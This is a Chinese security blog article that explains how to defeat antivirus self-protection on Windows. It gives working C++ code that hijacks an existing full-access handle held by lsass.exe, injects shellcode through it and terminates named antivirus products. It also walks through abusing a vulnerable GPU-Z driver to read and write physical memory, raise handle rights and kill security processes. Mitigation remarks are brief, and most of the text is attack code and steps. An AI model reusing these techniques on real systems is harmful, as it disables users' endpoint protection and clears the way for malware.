## 0x0 -自我保护原理

在WIN7 X64位系统后杀毒软件的自我保护一般都是通过OBOperationRegistration实现:

    
    
    VOID InstallCallBacks()
    {
    	NTSTATUS NtHandleCallback = STATUS_UNSUCCESSFUL;
    	NTSTATUS NtThreadCallback = STATUS_UNSUCCESSFUL;
    	OB_OPERATION_REGISTRATION OBOperationRegistration[2];
    	OB_CALLBACK_REGISTRATION OBOCallbackRegistration;
    	REG_CONTEXT regContext;
    	UNICODE_STRING usAltitude;
    	memset(&OBOperationRegistration, 0, sizeof(OB_OPERATION_REGISTRATION));
    	memset(&OBOCallbackRegistration, 0, sizeof(OB_CALLBACK_REGISTRATION));
    	memset(&ampregContext, 0, sizeof(REG_CONTEXT));
    	regContext.ulIndex = 1;
    	regContext.Version = 120;
    	RtlInitUnicodeString(&usAltitude, L"1000");
    	if ((USHORT)ObGetFilterVersion() == OB_FLT_REGISTRATION_VERSION)
    	{
    
    
    		OBOperationRegistration[1].ObjectType = PsProcessType;
    		OBOperationRegistration[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    		OBOperationRegistration[1].PreOperation = ProcessHandleCallbacks;
    		OBOperationRegistration[1].PostOperation = HandleAfterCreat;
    		OBOperationRegistration[0].ObjectType = PsThreadType;
    		OBOperationRegistration[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    		OBOperationRegistration[0].PreOperation = ThreadHandleCallbacks;
    		OBOperationRegistration[0].PostOperation = HandleAfterCreat;
    		OBOCallbackRegistration.Version = OB_FLT_REGISTRATION_VERSION;
    		OBOCallbackRegistration.OperationRegistrationCount = 2;
    		OBOCallbackRegistration.RegistrationContext = &ampregContext
    		OBOCallbackRegistration.OperationRegistration = OBOperationRegistration;
    		NtHandleCallback = ObRegisterCallbacks(&OBOCallbackRegistration, &g_CallbacksHandle); // Register The CallBack
    		if (!NT_SUCCESS(NtHandleCallback))
    		{
    			if (g_CallbacksHandle)
    			{
    				ObUnRegisterCallbacks(g_CallbacksHandle);
    				g_CallbacksHandle = NULL;
    			}
    			DebugPrint("[DebugMessage] Failed to install ObRegisterCallbacks: 0x%08X.\n", NtHandleCallback);
    		}
    		else
    			DebugPrint("[DebugMessage] Success: ObRegisterCallbacks Was Be Install\n");
    	}
    	PsSetCreateProcessNotifyRoutine(CreateProcessNotify, FALSE);
    }  
    
    
    
    OB_PREOP_CALLBACK_STATUS ProcessHandleCallbacks(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)
    {
    	UNREFERENCED_PARAMETER(RegistrationContext);
    	if (g_MyPorcess == -1)
    		return OB_PREOP_SUCCESS;
    	if (OperationInformation->KernelHandle)
    		return OB_PREOP_SUCCESS;
    	PEPROCESS ProtectedProcessPEPROCESS;
    	PEPROCESS ProtectedUserModeACPEPROCESS;
    	PEPROCESS OpenedProcess = (PEPROCESS)OperationInformation->Object, CurrentProcess = PsGetCurrentProcess();
    	ULONG ulProcessId = (ULONG)PsGetProcessId(OpenedProcess);
    	ULONG myProcessId = (ULONG)PsGetProcessId(CurrentProcess);
    
    	if (ulProcessId == g_MyPorcess) //如果进程我们的进程
    	{
    		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE) // 句柄降权
    		{
    			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE)
    			{
    				//移除杀死进程的权限
    				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
    			}
    			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_OPERATION) == PROCESS_VM_OPERATION)
    			{
    				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
    			}
    			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_READ) == PROCESS_VM_READ)
    			{
    				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
    			}
    			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_WRITE) == PROCESS_VM_WRITE)
    			{
    				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_WRITE;
    			}
    
    		}
    	}
    
    	return OB_PREOP_SUCCESS;  
    

当某些软件使用openprocess打开了杀毒软件的进程的时候,会触发这个回调,对openprocess的句柄进行降权操作.使得我们无法使用TerminateProcess、WriteProcessMemory、ReadProcessMemory这些需要用到HANDLE的东西对杀毒软件进行XXOO.也就实现了
"进程保护"

## 0x1 -R3 Bypass

### 0x1 -原理

理论上,之前的OBOperationRegistration实现的句柄保护已经够全面了.基本上R3的病毒木马是无法伤害到杀毒软件的.但是很多杀毒软件忽略了已经存在的具有完全读写权限的进程句柄
比如lsass.exe
，csrss.exe中存在的句柄(这个方法存在了很久很久,懂的人一直拿来默默使用,不公开,但国外的harakirinox在UC上发布了关于句柄劫持的方法而且还是完整的可以直接抄就用了导致这个方法泛滥然后被国外反作弊BE
EAC修复,有意思的是TP在今年7月份国内的人在看雪论坛上发帖总结经验的时候还没有修复这个问题)

这里我们以火绒为例子

我们可以看到火绒的HipsTray.exe是无法被结束任务的

![](https://image.3001.net/images/20191122/1574437268_5dd80194cd59f.png!small)

通过搜索 我们发现在lsass.exe里面存在hipstray的完整句柄:

![](https://image.3001.net/images/20191123/1574438504_5dd80668b7d6b.png!small)

图中可以看到,这个句柄有完整的权限

### 0x2 -实现

为了实现这个,我们需要这几个步骤:

> 1\. 通过ZwQuerySystemInformation查询伪句柄表
>
> 2\. 查询有权限的句柄的程序
>
> 3\. XXOO那个拥有目标程序的权限句柄的程序

第一步:

ZwQuerySystemInformation第0x10号功能就可以输出PSYSTEM_HANDLE_INFORMATION_EX结构的东西,微软没有公开这个东西,结构如下:

    
    
    typedef struct _SYSTEM_HANDLE_INFORMATION
    {
    	ULONG ProcessId;//进程标识符 
    	UCHAR ObjectTypeNumber;//打开的对象的类型
    	UCHAR Flags;//句柄属性标志
    	USHORT Handle;//句柄数值,在进程打开的句柄中唯一标识某个句柄
    	PVOID Object;//这个就是句柄对应的EPROCESS的地址
    	ACCESS_MASK GrantedAccess;//句柄对象的访问权限
    }SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
    typedef struct _SYSTEM_HANDLE_INFORMATION_EX
    {
    	ULONG NumberOfHandles;
    	SYSTEM_HANDLE_INFORMATION Information[655360];
    }SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;  
    

查询代码:  

    
    
    PSYSTEM_HANDLE_INFORMATION_EX QueryHandleTable()
    {
    	ULONG cbBuffer = sizeof(SYSTEM_HANDLE_INFORMATION_EX);
    	LPVOID pBuffer = (LPVOID)malloc(cbBuffer);
    	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = nullptr;
    	if (pBuffer)
    	{
    		pfn_ZwQuerySystemInformation(0x10, pBuffer, cbBuffer, NULL);
    		HandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)pBuffer;
    	}
    	return HandleInfo;
    }  
    

之后我们遍历整个句柄结构,查询出我们需要的句柄,通过EPROCESS判断是否是目标进程句柄,如何进行句柄权限、类别过滤。值得注意的是句柄类型为7才是process类的句柄.  

    
    
    DWORD64 GetTarEPROCESS() 
    {
    	HANDLE TarHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, g_ProcessID);
    	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = QueryHandleTable();
    	DWORD64 EPROCESS;
    	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
    	{
    		if (HandleInfo->Information[i].Handle == (USHORT)TarHandle && HandleInfo->Information[i].ProcessId == GetCurrentProcessId())
    		{
    			EPROCESS = (DWORD64)HandleInfo->Information[i].Object;
    			break;
    		}
    	}
    	free(HandleInfo);
    	CloseHandle(TarHandle);
    	return EPROCESS;
    }
    bool FuckUpProcess()
    {
    	bool Found = false;
    	DWORD64 TarEPROCESS = GetTarEPROCESS();
    	if (!TarEPROCESS)
    	{
    		std::cout << "找不到EPROCESS" << std::endl;
    		return Found;
    	}
    	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = QueryHandleTable();
    	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
    	{
    		//7 是 process 属性
    		if (HandleInfo->Information[i].ObjectTypeNumber == 7)
    		{
    			if((DWORD64)HandleInfo->Information[i].Object != TarEPROCESS)
    				continue;
    			//排除掉目标进程的PID
    			if (HandleInfo->Information[i].ProcessId == g_ProcessID)
    				continue;
    			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_VM_READ) != PROCESS_VM_READ)
    				continue;
    			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_VM_OPERATION) != PROCESS_VM_OPERATION)
    				continue;
    			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_QUERY_INFORMATION) != PROCESS_QUERY_INFORMATION)
    				continue;
    			//由于火绒找不到可用TERMINATE的权限,只能用方案2 但是PCHUNTER却可以
    			//if ((HandleInfo->Information[i].GrantedAccess & PROCESS_TERMINATE) != PROCESS_TERMINATE)
    			//	continue;
    			//执行shellcode映射操作
    			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleInfo->Information[i].ProcessId);
    			if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
    				continue;
    			std::cout << "在 " << HandleInfo->Information[i].ProcessId << " 中找到了一个合适句柄! HANDLE 为: 0x" << std::hex << HandleInfo->Information[i].Handle << std::endl;
    			if(!DoShellCodeInject(hProcess, (HANDLE)HandleInfo->Information[i].Handle))
    				continue;
    			Found = true;
    			break;
    		}
    	}
    	free(HandleInfo);
    	return Found;
    }  
    

找到我们需要的句柄并且PID后(其实是lsass.exe的PID),我们就开始利用那个句柄,我们不能做句柄复制因为句柄复制依然会触发句柄限制回调,所以我们要注入东西到那个拥有火绒句柄的PID进程里面,但是我们不能直接注入DLL,因为直接注入DLL很容易被发现.太愚蠢.所以我这边选择是注入shellcode,简单方便.一开始我想直接利用句柄去关掉火绒但是火绒没有Terminate的对应的权限只能自己再打开一个句柄然后用这个句柄关掉它.当然他有读写权限也可以直接清零内存或者修改区段属性触发火绒崩溃.但是那是后话了,现在最方便的方法就是单独新开一个句柄然后杀掉进程:  

    
    
    typedef struct _SHELLCODE
    {
    	HANDLE fnHandle;
    	DWORD fnPID;
    	pTerminateProcess fnTerminateProcess;
    	pOpenProcess fnOpenProcess;
    }SHELLCODE, * PSHELLCODE;
    DWORD WINAPI InjectShellCode(PVOID p)
    {
    	PSHELLCODE shellcode = (PSHELLCODE)p;
    	//由于火绒没有Terminate权限,所以使用方案2
    	//shellcode->fnTerminateProcess(shellcode->fnHandle,0);
    	HANDLE hProcess = shellcode->fnOpenProcess(0x001FFFFF, 0, shellcode->fnPID);
    	shellcode->fnTerminateProcess(hProcess, 0);
    	return TRUE;
    }
    DWORD WINAPI InjectShellCodeEnd()
    {
    	return 0;
    }  
    

注入代码如下:  

    
    
    bool DoShellCodeInject(HANDLE handle, HANDLE TarHandle)
    {
    	bool success = false;
    	LPVOID addrss_shellcode = VirtualAllocEx(handle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    	if (addrss_shellcode)
    	{
    		//设置shellcode
    		SHELLCODE ManualInject;
    		memset(&ManualInject, 0, sizeof(SHELLCODE));
    		ManualInject.fnTerminateProcess = TerminateProcess;
    		ManualInject.fnHandle = TarHandle;
    		ManualInject.fnPID = g_ProcessID;
    		ManualInject.fnOpenProcess = OpenProcess;
    		std::cout << "TarHandle 0x" << std::hex << TarHandle << std::endl;
    		//写shellcode到目标进程
    		if (WriteProcessMemory(handle, addrss_shellcode, &ManualInject, sizeof(SHELLCODE), NULL) &&
    			WriteProcessMemory(handle, (PVOID)((PSHELLCODE)addrss_shellcode + 1), InjectShellCode, (DWORD)InjectShellCodeEnd - (DWORD)InjectShellCode, NULL))
    		{
    			HANDLE hThread = CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)((PSHELLCODE)addrss_shellcode + 1), addrss_shellcode, 0, NULL);
    			if (!hThread)
    				std::cout << "CreateRemoteThread 失败 " << GetLastError() << std::endl;
    			else
    			{
    				WaitForSingleObject(hThread, INFINITE);
    				std::cout << "injected " << std::dec << GetProcessId(handle) <<" AT:"<< std::hex << addrss_shellcode << " Status "<< GetLastError() << std::endl;
    				success = true;
    			}
    		}
    		else
    		{
    			std::cout << "WriteProcessMemory 失败 " << GetLastError() << std::endl;
    		}
    		VirtualFreeEx(handle, addrss_shellcode, 0, MEM_RELEASE);
    	}
    	else
    	{
    		std::cout << "VirtualAllocEx 失败 " << GetLastError() << std::endl;
    	}
    	return success;
    }  
    

之后就顺利关掉火绒了,当然此方法也适用于金山、腾讯、安全狗、以及很多国外的杀毒软件,不需要驱动、不需要其他的操作就可以干掉他们了,当然思维可以发散一点,直接用这个句柄注入恶意代码到杀毒软件里面进行操作也不是不可以。顺便说一句我测试只有360没有被打败,有意思的是这个漏洞我提交到某src的时候他们回复如下:

![](https://image.3001.net/images/20191202/1575279909_5de4dd253b7fa.png!small)

然而在国内的腾讯、火绒、金山、安全狗中我并没有看到对应的解决方案,依然能被这种方法杀掉进程与保护.连免杀都不用做了.

以下gif录制于11月

![](https://image.3001.net/images/20191123/1574518111_5dd93d5f6261b.gif!small)

![](https://image.3001.net/images/20191123/1574518111_5dd93d5fa519d.gif!small)

![](https://image.3001.net/images/20191123/1574518111_5dd93d5f2e7cc.gif!small)

整个源码打包在我到github上,链接在文章末尾

### 0x3 不足&修复:

> 不足: Wind10之后有PPL保护(但是似乎没软用,好像PPL保护只保护system.exe,而有句柄的lsass.exe
> ，csrss.exe却没有PPL保护,笔者WIN10测试能正常干掉火绒)
>
> 修复:杀毒软件只需要对这些句柄进行去除权限操作即可.360很早之前就已经实现了.

## 0x2 -R0 Bypass

### 0x1 原理

我们这里的R0
bypass不是自己写驱动去对抗,因为没有意义,一来杀毒软件很容易就拦截了驱动,二来在同等地位上的对抗完全失去了精髓.我们这里说的是如何利用存在提权漏洞的正常驱动进行提权操作.

这种漏洞 非常 非常 非常常见,技嘉、华硕、某驱动管理程序、某大型社交软件、某杀毒软件 都出现过.这里不一一举例.大家只要有耐心就一定可以发现的.

这里以我早些时候挖的GPUZ的驱动为例子(之前发在看雪和UC上不过只是关掉DSE的版本,今天的是提权版,因为懒得重新找漏洞了):

就是这玩意

![](https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1574528760264&di=6b6308d5a3923b98b114d6da2e8d136d&imgtype=0&src=http%3A%2F%2Fsoft.hao123.com%2Fuploads%2F2014%2F0819%2F2014081915154453f2f9a0a15f1.jpg)

### 0x2 -实现:

官网可以直接下载,然后通过bat脚本得到他的驱动(他会自己删除自己,似乎自删除是他的漏洞修补措施.....

    
    
    @echo off
    set syspath=C:\Users\sword\AppData\Local\Temp\GPU-Z.sys
    :loop
    if exist "%syspath%" (copy "%syspath%" c:\sys.bak) else (
    echo ...)
    goto :loop  
    

在他的driverentry里找到他的IO控制函数

![](https://image.3001.net/images/20191123/1574518924_5dd9408c0f8b7.png!small)

我们可以看到他的IO控制码完全没有加密暴露在IDA里面其中0x80006448被用于读取msr

![](https://image.3001.net/images/20191123/1574518969_5dd940b900e8f.png!small)

0x8000644C被用于写msr

![](https://image.3001.net/images/20191123/1574519018_5dd940eaad738.png!small)

0x8000645C和0x80006460被用于MDL的操作:

![](https://image.3001.net/images/20191123/1574519086_5dd9412ede230.png!small)

![](https://image.3001.net/images/20191123/1574519096_5dd94138e5ea9.png!small)

因此,我们得出结论,这个驱动没有进行验证,我们可以通过0x8000645C和0x80006460
去映射物理内存,然后进行XXOO操作,首先我们通过IDA逆向得知结构如下

![](https://image.3001.net/images/20191123/1574519257_5dd941d9e2217.png!small)

控制码如下

![](https://image.3001.net/images/20191123/1574519284_5dd941f40f906.png!small)

因此利用这IOCTL控制码进行通讯读物理内存:

![](https://image.3001.net/images/20191123/1574519428_5dd94284af749.png!small)

写物理内存:

![](https://image.3001.net/images/20191123/1574519446_5dd942962b30d.png!small)

注意两点: 我们只能写 4的倍数的长度的数据

MDL映射完毕后必须调用释放的函数否则会造成蓝屏.

到此,物理内存读写完毕.但是要读虚拟内存,我们必须进行转换,转换操作代码抄了国外的大神的:

    
    
    /* Translating Virtual Address To Physical Address, Using a Table Base */
    uint64_t gpuz::TranslateVirtualAddress(uint64_t directoryTableBase, LPVOID virtualAddress)
    {
    	auto va = (uint64_t)virtualAddress;
    
    	auto PML4 = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
    	auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
    	auto Directory = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
    	auto Table = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index
    
    											   // 
    											   // Read the PML4 Entry. DirectoryTableBase has the base address of the table.
    											   // It can be read from the CR3 register or from the kernel process object.
    											   // 
    	auto PML4E = ReadPhysicalAddress<uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));
    
    	if (PML4E == 0)
    		return 0;
    
    	// 
    	// The PML4E that we read is the base address of the next table on the chain,
    	// the Page-Directory-Pointer Table.
    	// 
    	auto PDPTE = ReadPhysicalAddress<uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));
    
    	if (PDPTE == 0)
    		return 0;
    
    	//Check the PS bit
    	if ((PDPTE & (1 << 7)) != 0) {
    		// If the PDPTE抯 PS flag is 1, the PDPTE maps a 1-GByte page. The
    		// final physical address is computed as follows:
    		// ?Bits 51:30 are from the PDPTE.
    		// ?Bits 29:0 are from the original va address.
    		return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
    	}
    
    	//
    	// PS bit was 0. That means that the PDPTE references the next table
    	// on the chain, the Page Directory Table. Read it.
    	// 
    	auto PDE = ReadPhysicalAddress<uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));
    
    	if (PDE == 0)
    		return 0;
    
    	if ((PDE & (1 << 7)) != 0) {
    		// If the PDE抯 PS flag is 1, the PDE maps a 2-MByte page. The
    		// final physical address is computed as follows:
    		// ?Bits 51:21 are from the PDE.
    		// ?Bits 20:0 are from the original va address.
    		return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
    	}
    
    	//
    	// PS bit was 0. That means that the PDE references a Page Table.
    	// 
    	auto PTE = ReadPhysicalAddress<uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));
    
    	if (PTE == 0)
    		return 0;
    
    	//
    	// The PTE maps a 4-KByte page. The
    	// final physical address is computed as follows:
    	// ?Bits 51:12 are from the PTE.
    	// ?Bits 11:0 are from the original va address.
    	return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
    }

我们还需要得到PDBR的内容,用于转换物理内存和虚拟内存:

CR3寄存器含有存放页目录表页面的物理地址，因此CR3也被称为PDBR

得到CR3的方法是暴力特征码穷举,这里是我的朋友Truman的思路,非常感谢他开辟的新思路:

![](https://image.3001.net/images/20191123/1574519708_5dd9439c1b9bd.png!small)

之后就可以愉快的进行系统内存的读写了:

![](https://image.3001.net/images/20191123/1574519744_5dd943c06507e.png!small)

![](https://image.3001.net/images/20191123/1574519749_5dd943c59838a.png!small)

然后我们要进行提权操作.具体方案是我们可以通过handletable修改我们的句柄权限到完整权限达到(提权) 然后直接正常关掉杀毒软件即可

handle在哪?

每个系统的偏移都不一样,比如WIN7的是:

![](https://image.3001.net/images/20191123/1574520065_5dd94501168ab.png!small)

EPROCESS + 0x200

![](https://image.3001.net/images/20191123/1574520091_5dd9451b8abd1.png!small)

前几个是一个union结构，GrantedAccess是我们要修改的权限:

首先我们打开要结束的进程：

![](https://image.3001.net/images/20191124/1574526152_5dd95cc86072b.png!small)

这样我们就拥有了一个权限为PROCESS_QUERY_LIMITED_INFORMATION的句柄,然后 为了修改这个句柄的GrantedAccess,
我们需要遍历eprocess得到自己的DirectoryTableBase用于读写进程的内存:

![](https://image.3001.net/images/20191124/1574526122_5dd95caa55694.png!small)

我标注的偏移均可以用WINBGD找eprocess结构找到,每个版本的操作系统的偏移不同

有了DirectoryTableBase后 我们就可以通过TranslateVirtualAddress 和ReadPhysicalAddress
/WritePhysicalAddress 读写进程内存了:

![](https://image.3001.net/images/20191124/1574526565_5dd95e65d8c23.png!small)

因为我们不能直接调用ExpLookupHandleTableEntry,所以只能通过IDA中的逆向代码来实现跟ExpLookupHandleTableEntry一样的功能:

    
    
    //这一段是IDA里面看WIN7的ExpLookupHandleTableEntry函数修改而来的
    PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntryWin7(PHANDLE_TABLE HandleTable, ULONGLONG Handle, ProcessContext cur_context)
    {
    	ULONGLONG v2;     // r8@2
    	ULONGLONG v3;     // rcx@2
    	ULONGLONG v4;     // r8@2
    	ULONGLONG result; // rax@4
    	ULONGLONG v6;     // [sp+8h] [bp+8h]@1
    	ULONGLONG table = (ULONGLONG)HandleTable;
    
    	v6 = Handle;
    	v6 = Handle & 0xFFFFFFFC;
    	if (v6 >= *(DWORD*)(table + 92)) {
    		result = 0i64;
    	}
    	else {
    		v2 = (*(ULONGLONG*)table);
    		v3 = (*(ULONGLONG*)table) & 3i64;
    		v4 = v2 - (ULONG)v3;
    		if ((ULONG)v3) {
    			if ((DWORD)v3 == 1)
    				result = read<ULONGLONG>((((Handle - (Handle & 0x3FF)) >> 7) + v4), cur_context) + 4 * (Handle & 0x3FF);
    			else
    				result = read<ULONGLONG>((PVOID)(read<ULONGLONG>((PVOID)(((((Handle - (Handle & 0x3FF)) >> 7) - (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)) >> 9) + v4), cur_context) + (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)), cur_context) + 4 * (Handle & 0x3FF);
    		}
    		else {
    			result = v4 + 4 * Handle;
    		}
    	}
    	return (PHANDLE_TABLE_ENTRY)result;
    }  
    

有了ExpLookUpHandleTableEntry后就可以愉快的修改权限了:

![](https://image.3001.net/images/20191124/1574526723_5dd95f030794e.png!small)

将我们句柄的PROCESS_QUERY_LIMITED_INFORMATION 提升为PROCESS_ALL_ACCESS
然后TerminateProcess 干掉进程.

![](https://image.3001.net/images/20191124/1574526769_5dd95f3102b49.png!small)

我写了一个for来批量干掉电脑管家的:

![](https://image.3001.net/images/20191124/1574526799_5dd95f4f37540.png!small)

提升句柄这部分代码大部分来自于国外大神MarkHC的HandleMaster源码.他是使用cpuzid的驱动去进行句柄权限提升,而我是使用gpuz的驱动,cpuid中的可以直接读cr寄存器而不需要暴力穷举.

HandleMaster fork地址:

<https://github.com/huoji120/HandleMaster>

效果如下:

![](https://image.3001.net/images/20191124/1574527129_5dd960990110a.gif!small)

### 0x3 -修复&对抗

测试大部分杀毒软件都无法抵御这种攻击,原因如下:

> 1\. 驱动是绿色正常驱动,不是黑名单驱动
>
> 2.拦截这些驱动加载会导致正常软件无法使用
>
> 3.无法判断自身是否被攻击

目前唯一能抵抗一下的是360会提示有可疑驱动加载,其原理很简单,就是判断加载驱动程序的数字签名 是否等于
被加载驱动的数字签名,如果不等于则提示一下,但是也挺鸡肋的大不了包含个原程序通过原程序加载驱动即可.

修复:

> 使用VT/SVM 来HOOK API比如NtTerminateProcess等内核函数来实现增强版保护(某卫士的晶核保护是这个道理).

## 0x3 总结

写这篇文章一共花了笔者2天时间来进行资料搜集和代码实现.很多一笔一张图片带过的部分其实是经过了无数次试验而来.写这篇文章的时候笔者不禁想起了十二年前的想成为黑客定一个小目标先干掉杀毒软件却撞成愣头青的自己,如今十二年过去了以笔者的能力自认为干掉杀毒软件变成易如反掌的事情了,但是笔者却成为了一个送外卖的外卖小哥.安全路漫漫,要学的东西还有很多.

本次项目的github链接,包含R3和R0的利用方法:<https://github.com/huoji120/Antivirus_R3_bypass_demo>

 ***本文原创作者：huoji120，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

